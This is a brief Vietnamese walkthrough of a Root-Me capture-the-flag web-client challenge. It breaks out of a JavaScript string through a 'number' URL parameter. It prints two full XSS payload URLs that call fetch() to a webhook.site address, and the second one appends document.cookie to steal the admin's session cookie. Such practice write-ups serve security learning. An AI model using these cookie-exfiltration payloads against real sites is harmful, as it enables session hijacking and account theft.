Challenge: http://challenge01.root-me.org/web-client/ch32/

Ta thử với 1 số bất kì: 
![alt text](image.png)

Qua mã nguồn ta thấy số 3 được thêm vào:
![alt text](image-1.png)

Dùng `'` để thoát input và chèn thêm js: 
![alt text](image-2.png)
![alt text](image-3.png)


Bây giờ ta chèn thêm webhook để lấy cookie: 
`http://challenge01.root-me.org/web-client/ch32/?number=%27;fetch(%22https://webhook.site/a79b7f74-f2fd-4fa5-8465-8b2b267acf3d%22);//`

![alt text](image-4.png)

Lấy thêm cookie:
`http://challenge01.root-me.org/web-client/ch32/?number=%27;fetch(%22https://webhook.site/a79b7f74-f2fd-4fa5-8465-8b2b267acf3d?c=%22.concat(document.cookie));//`
![alt text](image-5.png)

Gửi admin và nhận flag:
![alt text](image-6.png)



